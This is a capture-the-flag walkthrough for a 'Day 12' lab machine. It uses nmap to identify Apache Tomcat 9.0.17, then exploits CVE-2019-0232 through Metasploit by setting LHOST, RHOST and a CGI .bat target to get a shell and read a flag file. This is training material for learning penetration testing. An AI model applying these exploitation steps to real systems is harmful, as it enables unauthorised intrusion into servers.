# Day12

## Ready, set, elf.

Deploy the machine and go through the given information!

First step, let’s run an nmap scan! Here i am running this with ***-Pn -A*** so that it shows the versions also

`nmap -Pn -A 10.10.183.54`

![57](https://user-images.githubusercontent.com/83836972/122556469-29fc4f00-d059-11eb-9544-ceb3737b4cf1.PNG)

Also, in front of ***http-proxy***,  ***Apache Tomcat 9.0.17*** will be shown which is the ***type and version of web-server***

Alternative to this is, you can have a look at port 8080, which will show a webserver like below:

![58](https://user-images.githubusercontent.com/83836972/122556473-2ec10300-d059-11eb-81bb-0c87cef367ff.PNG)

Here the answer to the question 1 is done, let's move onto the next one!

For the next question, you've to ***google the CVE***, and it's very easy to find, so surf the net!

For the next questions, open ***Metasploit***

Search for CVE number, i.e. search ***2019-0232***

Now we must ***set up our hosts***. This can be done pretty simply by setting LHOST to the IP of our PC and the RHOSTS to the IP of the target machine:

`set LHOST 10.17.5.246`
`set RHOST 10.10.183.54`
`set TARGETURI http://10.10.183.54/cgi-bin/elfwhacker.bat`

After setting the hosts, just ***run*** that using `run` and also to use system commands on host, we'll use ***shell***, which is also written in the dossier, so just give the command `shell`.

If you search for the directories using `dir`, you'll see the following:

![59](https://user-images.githubusercontent.com/83836972/122556484-341e4d80-d059-11eb-9e14-0b190b408f23.PNG)

Now just, get the flag using `type flag1.txt`



